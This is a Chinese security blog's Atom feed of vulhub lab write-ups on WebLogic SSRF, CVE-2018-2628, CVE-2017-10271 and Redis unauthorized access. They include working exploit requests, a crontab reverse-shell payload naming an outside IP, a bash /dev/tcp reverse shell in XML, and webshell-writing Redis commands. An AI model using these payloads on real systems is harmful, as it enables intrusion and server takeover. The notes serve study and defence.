<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>redfish的学习笔记</title>
  
  <subtitle>redfish的学习笔记</subtitle>
  <link href="https://redredredfish.github.io/atom.xml" rel="self"/>
  
  <link href="https://redredredfish.github.io/"/>
  <updated>2021-12-21T18:16:21.034Z</updated>
  <id>https://redredredfish.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>vulhub weblogic ssrf复现</title>
    <link href="https://redredredfish.github.io/2021/11/20/vulhub-weblogic-ssrf%E5%A4%8D%E7%8E%B0/"/>
    <id>https://redredredfish.github.io/2021/11/20/vulhub-weblogic-ssrf%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-11-19T18:05:00.000Z</published>
    <updated>2021-12-21T18:16:21.034Z</updated>
    
    <content type="html"><![CDATA[<p>VPS:x.x.x.x</p><p>跳板机debian：192.168.130.129 weblogic</p><p>内网ubuntu：192.168.130.132 redis</p><p>1、operator参数可以调用外部url，由于未做限制，造成ssrf，可以借助它探测服务器端口，如下两种不同的报错</p><p><a href="http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001">http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</a></p><p><a href="http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:3389">http://192.168.130.129:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:3389</a></p><p>2、通过ssrf探测内网主机，发现内网主机192.168.130.132开启6379且存在redis未授权，可以通过http的get请求写入shell</p><p>为什么get请求能写shell</p><blockquote><p>1、redis未授权 </p></blockquote><blockquote><p>2、redis通过换行符(\r\n)来分隔命令 </p></blockquote><blockquote><p>3、目标主机开启定时任务</p></blockquote><p>3、VPS监听6666端口</p><p><code>root@iZbp1h497hkijddeblcm8jZ:~# nc -lvp 6666 Listening on [0.0.0.0] (family 0, port 6666)</code></p><p>4、get写定时任务 shell /etc/crontab</p><p><code>set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &#39;sh -i &gt;&amp; /dev/tcp/VPS:ip/6666 0&gt;&amp;1&#39;\n\n\n\n&quot;</code></p><p><code>config set dir /etc/</code></p><p><code>config set dbfilename crontab</code></p><p><code>save</code></p><p>命令之间用\r\n分隔，url编码%0D%0A，全部url编码</p><p><code>set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20&#39;sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F47.97.50.242%2F6666%200%3E%261&#39;%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A</code></p><p>5、传参，反弹shell</p><p><strong>遇到的坑</strong></p><blockquote><p>1.定时任务不一定会执行 </p></blockquote><blockquote><p>2.不同系统定时任务目录不一样 </p></blockquote><blockquote><p>/etc/crontab #大部分linux </p></blockquote><blockquote><p>/etc/cron.d/ #ubuntu</p></blockquote><blockquote><p>/var/spool/cron/root #centOS </p></blockquote><blockquote><p>/var/spool/cron/crontabs/root #debian</p></blockquote><blockquote><p>3.不太理解README里的shell最后为啥要加个aaa</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;VPS:x.x.x.x&lt;/p&gt;
&lt;p&gt;跳板机debian：192.168.130.129 weblogic&lt;/p&gt;
&lt;p&gt;内网ubuntu：192.168.130.132 redis&lt;/p&gt;
&lt;p&gt;1、operator参数可以调用外部url，由于未做限制，造成ssrf，可以</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="ssrf" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/ssrf/"/>
    
    
    <category term="ssrf" scheme="https://redredredfish.github.io/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>weblogic反序列化漏洞的初级理解(二)</title>
    <link href="https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%BA%8C/"/>
    <id>https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%BA%8C/</id>
    <published>2021-07-08T07:18:00.000Z</published>
    <updated>2021-12-06T07:19:19.216Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>接着上篇，这次复现经典的weblogic反序列化漏洞—CVE-2018-2628<br>属于利用T3协议配合RMP接口反向发送反序列化数据。<br>同样先利用vulhub快速复现，然后再来看看原理。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><p><strong>CVE-2018-2628</strong></p><p>影响范围：10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</p><p>docker开启环境</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/vulhub/weblogic/CVE<span class="number">-2018</span><span class="number">-2628</span># docker-compose up -d</span><br></pre></td></tr></table></figure><p>浏览器访问localhost:7001/console，出现weblogic的登录界面，说明环境已经搭好了 (╹ڡ╹ )vulhub yyds!<br><img src="https://img-blog.csdnimg.cn/2a955af9856043f692be35fe513c9817.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以看到weblogic的版本是10.3.6.0<br><img src="https://img-blog.csdnimg.cn/a557cec6b40e404dbf4e3af94f706638.png" alt="在这里插入图片描述"><br>利用ysoserial启动一个JRMP Server服务监听<br>这里插一句编译ysoserial注意JDK版本不要过高，建议在1.7u21以下，卡了好久┗|｀O′|┛</p><p>开启监听，命令执行这里老办法，尝试新建一个shell文件，比较直观</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial<span class="number">-0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 端口 CommonsCollections1 <span class="string">&quot;touch /tmp/shell&quot;</span></span><br></pre></td></tr></table></figure><p>使用vulhub提供的<a href="https://www.exploit-db.com/exploits/44553">exp脚本</a>，为了方便，保存在ysoserial-0.0.6-SNAPSHOT-all.jar同目录下<br><img src="https://img-blog.csdnimg.cn/7321d6da71cd498d8f66c70b27f8dd2a.png" alt="在这里插入图片描述"><br>执行exp</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE<span class="number">-2018</span><span class="number">-2628</span><span class="built_in">exp</span>.py [开启weblogic的IP] [端口] ysoserial<span class="number">-0.0</span><span class="number">.6</span>-SNAPSHOT-all.jar [开启JRMP Server的IP] [监听端口] JRMPClient</span><br></pre></td></tr></table></figure><p>exp开始跑，监听成功<br><img src="https://img-blog.csdnimg.cn/9e7864110b8344daaebcd3277cc76204.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/67d1250a0726414a93310e30ce2a5210.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_9,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>exp跑完，进入docker容器查看文件是否创建成功</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/vulhub/weblogic/CVE<span class="number">-2018</span><span class="number">-2628</span># docker-compose exec weblogic bash</span><br></pre></td></tr></table></figure><p>复现完成<br><img src="https://img-blog.csdnimg.cn/3402a535775d4a249ee1f159048a9af0.png" alt="在这里插入图片描述"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>看一下官方的漏洞简介</p><blockquote><p>Oracle WebLogic Server是美国甲骨文（Oracle）公司的一款适用于云环境和传统环境的应用服务器，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理。WLS Core是其中的一个核心组件。 Oracle WebLogic Server中的WLS核心组件存在远程代码执行漏洞。攻击者可通过远程发送攻击数据，借助T3协议在WebLogic Server中执行反序列化操作利用该漏洞执行代码。</p></blockquote><p>首先需要搞懂啥是T3协议</p><blockquote><p>T3协议：WebLogic Server 中的 RMI(远程方法调用)通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。<br>JRMP Server服务：java远程消息交换协议</p></blockquote><p>利用nmap快速检测T3协议是否开放</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV IP <span class="comment">--script=weblogic-t3-info.nse -p 7001</span></span><br></pre></td></tr></table></figure><p>大致流程<br><img src="https://img-blog.csdnimg.cn/28e34310f8614403a4f5e1c9690ee7a0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>结合exp来看<br>主函数很短，接收JRMP参数，执行exploit函数<br><img src="https://img-blog.csdnimg.cn/84f732105d204066bafd1397f1a46e7b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>exploit中，看名字t3_handshake和build_t3_request_object应该是建立T3连接，generate_payload应该是序列化数据,send_payload_objdata自然就是发送数据包了<br><img src="https://img-blog.csdnimg.cn/370052b335a348ab9ea093ec9679439a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发送T3协议头数据包<br><img src="https://img-blog.csdnimg.cn/b619f7664afe479d946a0e518c63d52c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>构造序列化数据包并发送<br><img src="https://img-blog.csdnimg.cn/9b4dc7845c604db68c837ed3f8ee405f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>打补丁<br>对T3协议进行访问控制</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/afanti/p/10256840.html">https://www.cnblogs.com/afanti/p/10256840.html</a><br><a href="https://blog.csdn.net/u014715599/article/details/85256193">https://blog.csdn.net/u014715599/article/details/85256193</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;&lt;strong&gt;前言&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;接着上篇，这次复现经典的weblogic反序列化漏洞—CVE-2018-2628&lt;br&gt;属于利用T3协议配</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="反序列化漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="反序列化漏洞" scheme="https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="weblogic反序列化" scheme="https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>weblogic反序列化漏洞的初级理解(一)</title>
    <link href="https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%B8%80/"/>
    <id>https://redredredfish.github.io/2021/07/08/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%9D%E7%BA%A7%E7%90%86%E8%A7%A3-%E4%B8%80/</id>
    <published>2021-07-08T03:07:00.000Z</published>
    <updated>2021-12-06T03:09:51.923Z</updated>
    
    <content type="html"><![CDATA[<p><strong>啥是weblogic</strong></p><blockquote><p>WebLogic是Oracle发布的一个基于JAVAEE架构的web中间件<br>大概可以理解为tomcat pro max🙃</p></blockquote><p><strong>Weblogic反序列化漏洞的几个利用阶段</strong><br>从利用方式来看,分为三类</p><blockquote><p>1.直接通过T3协议发送恶意反序列化对象(CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2020-2555、CVE-2020-2883)<br>2.利用T3协议配合RMP或ND接口反向发送反序列化数据(CVE2017-3248、CVE2018-2628、CVE2018-2893、CVE2018-3245、CVE-2018-3191、CVE-2020-14644、CVE-2020-14645)还有利用IIOP协议的CVE-2020-2551<br>3.通过 javabean XML方式发送反序列化数据。(CVE2017-3506-&gt;CVE-2017-10271-&gt;CVE2019-2725-&gt;CVE-2019-2729)</p></blockquote><p><strong>漏洞复现</strong><br>由于漏洞众多，搭建环境比较复杂，还是先利用vulhub中的CVE-2017-10271、CVE-2018-2628、CVE-2018-2894、CVE-2020-14882几个标志性的漏洞环境进行复现。</p><p>先从最古老的开始</p><p><strong>CVE-2017-10271</strong></p><p>影响范围：10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0</p><p>docker开启环境</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/vulhub/weblogic/CVE<span class="literal">-2017</span><span class="literal">-10271</span><span class="comment"># docker-compose up -d</span></span><br></pre></td></tr></table></figure><p>远古版本，环境好大先忍一下</p><p>等待的过程中先理解一下漏洞原理以及vulhub给出的poc</p><blockquote><p>该漏洞主要针对weblogic的WLS-WebServices组件<br>属于上述反序列化漏洞利用的第三类<br>大致的原理通过传输javabean XML方式构造恶意XML数据造成代码执行</p></blockquote><p>结合poc来看</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_131&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/ip/port 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p>大概是向网站的/wls-wsat/CoordinatorPortType路径传入xml数据，这串xml目的是反弹shell<br><img src="https://img-blog.csdnimg.cn/e2500d2d3ddb4d49bbdf14acc368c5ab.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_15,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>OK，环境起好开始复现</p><p>访问localhost:7001/wls-wsat/CoordinatorPortType，显示wls-wsat组件的一些配置信息，表示服务已经开启<br><img src="https://img-blog.csdnimg.cn/eed3402dcce94654be96b6284ffe06d3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_47,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>本地监听6666端口</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/<span class="comment"># nc -l -p 6666</span></span><br></pre></td></tr></table></figure><p>bp抓包重放构造好的数据包，注意字段Content-Type改为text/xml<br><img src="https://img-blog.csdnimg.cn/cea48ea1720d482daff11874f9990886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_50,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功反弹shell，服务器执行了我们传入的<br>/bin/bash -c bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1<br><img src="https://img-blog.csdnimg.cn/04d240f521704714b7b9f219bfbd052d.png" alt="在这里插入图片描述"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞利用的过程很简单<br>有两个疑问点</p><blockquote><p>1.wls-wsat组件如何处理xml数据<br>2.造成反序列化漏洞的关键点在哪</p></blockquote><p>尝试传入任意命令<br><img src="https://img-blog.csdnimg.cn/9be705e77d9448ada8c5aedf7d85f6ef.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在响应中看到了返回的xml数据以及整个处理过程的调用栈<br><img src="https://img-blog.csdnimg.cn/ab02563a2f654b6ea14cb3a14fad86d4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_47,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/89e4eb4967994b0ba45f623017f2c74b.png" alt="在这里插入图片描述"><br>可以看到处理过程最后调用了<code>java.beans.XMLDecoder</code>方法，该方法用于将XML数据反序列化为java对象，这里造成了无回显的命令执行</p><p>根据<a href="https://github.com/Tom4t0/Tom4t0.github.io/blob/master/_posts/2017-12-22-WebLogic%20WLS-WebServices%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.md">vulhub提供的技术文档</a>、参考<a href="https://blog.51cto.com/skytina/2055335">大佬的分析过程</a>可以得知大致的处理过程<br><img src="https://img-blog.csdnimg.cn/img_convert/4e4c200cb59a992165ce7d99a8095563.png#pic_center" alt="在这里插入图片描述"></p><blockquote><p>1.根据POC，当我们传入&#60;&#115;&#111;&#97;&#112;&#101;&#110;&#118;&#62;标签包裹的数据时，wls-wsat使用了weblogic自带的webservices处理程序来处理SOAP请求<br>2.该处理程序首先调用weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法获取到我们传入的xml数据为var1，定义var2为处理过的var1数据<br>3.通过var2.get()方法中的WorkAreaConstants.WORK_AREA_HEADER参数获取&lt;work:WorkContext &gt;标签中的内容<br>4.当var3不为空时，执行readHeaderOld(var3);</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/6a83462617931a7657bdcea01cb87b7d.png#pic_center" alt="在这里插入图片描述"></p><blockquote><p>5.在readHeaderOld中，实例化了WorkContextXmlInputAdapter，此时方法内的var4是java标签里的内容</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/010303fb6e49b8294420c3f88aa6d98e.png#pic_center" alt="在这里插入图片描述"></p><blockquote><p>6.在实例化WorkContextXmlInputAdapter中，直接调用xmlDecoder反序列化传入的xml数据，也就是处理过的var4</p></blockquote><p>从整个过程中可以发现，传入的xml数据从始至终都没有受到任何过滤，wls-wsat的类似剥洋葱的处理方式一层一层揭开最后直接反序列化，这样显然是很不安全滴。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;啥是weblogic&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WebLogic是Oracle发布的一个基于JAVAEE架构的web中间件&lt;br&gt;大概可以理解为tomcat pro max🙃&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;st</summary>
      
    
    
    
    <category term="web漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="反序列化漏洞" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="反序列化漏洞" scheme="https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="weblogic反序列化" scheme="https://redredredfish.github.io/tags/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>redis未授权访问</title>
    <link href="https://redredredfish.github.io/2021/07/07/helloworld/"/>
    <id>https://redredredfish.github.io/2021/07/07/helloworld/</id>
    <published>2021-07-07T08:05:00.000Z</published>
    <updated>2021-12-06T03:10:31.762Z</updated>
    
    <content type="html"><![CDATA[<h2 id="redis未授权访问的利用方式"><a href="#redis未授权访问的利用方式" class="headerlink" title="redis未授权访问的利用方式"></a>redis未授权访问的利用方式</h2><p><strong>漏洞原理：</strong><br>    Redis&lt;3.2默认情况下，会绑定在0.0.0.0:6379，如果没有进行采用相关的安全策略，比如添加防火墙黑白名单等等，这样会将Redis服务暴露在公网上。<br>如果在没有设置密码(默认为空)的情况下，会导致任意用户可以未授权访问Redis以及读取Redis的数据。攻击者利用Redis自身的提供的config命令，可以进行写文件操作，还可以将ssh公钥写入目标服务器./root/.ssh下的authotrized_keys 文件中，进而可以利用对应私钥直接使用ssh服务器登录目标服务器。<br>漏洞的产生条件有以下两点:</p><ol><li>Redis绑定在0.0.0.0:6379,且没有进行添加安全策略，直接暴露在公网</li><li>没有设置密码认证或者弱密码，可以免密登录redis服务</li></ol><p><strong>漏洞复现：</strong><br>环境：</p><ol><li>攻击机kali5.7.0 192.168.237.132</li><li>靶机1 Ubuntu16.04 192.168.237.128</li><li>靶机2 centOS7 192.168.237.133</li><li>redis 2.8.17</li></ol><p>靶机1开启redis-server，攻击机<code>./redis-cli -h</code> 尝试连接<br>由于靶机1没有开启安全策略且默认没有设置密码认证<br>造成攻击机可以未授权访问且执行命令获取敏感数据<br> <img src="https://img-blog.csdnimg.cn/6873e9d4e3da45ba88666a1477187c5d.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>利用方式一：webshell</strong><br>攻击机进行未授权访问，利用redis的<code>config set</code>命令将webshell写入靶机2网站目录下(*Redis Config Set 命令可以动态地调整 Redis 服务器的配置)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir <span class="comment">#设置路径</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename <span class="comment">#设置文件名</span></span><br><span class="line"><span class="built_in">set</span> webshell <span class="comment">#写入key值“webshell”对应的值</span></span><br><span class="line">save <span class="comment">#将所有key值保存在文件中</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/4794579e300c4dfbb8f128fc45613b8a.png" alt="在这里插入图片描述"></p><p>在靶机2上查看已经写入了shell.php文件<br><img src="https://img-blog.csdnimg.cn/13f46d7fdf2f477aa1f1b43080e35291.png" alt="在这里插入图片描述"></p><p>浏览器访问<code>http://靶机2/shell.php</code>,发现成功写入webshell<br><img src="https://img-blog.csdnimg.cn/0135013b3df04785ac006a4a0b7192d9.png" alt="在这里插入图片描述"></p><p>同理可写入一句话木马<br><code>\n\n\n</code>换行避免因&lt;?导致shell无法解析<br><img src="https://img-blog.csdnimg.cn/59b4b9b17924407ab064db617a35c649.png" alt="在这里插入图片描述"></p><p>菜刀成功连接<br><img src="https://img-blog.csdnimg.cn/c48cc4e5dae5436a8bce15d65c02e49b.png" 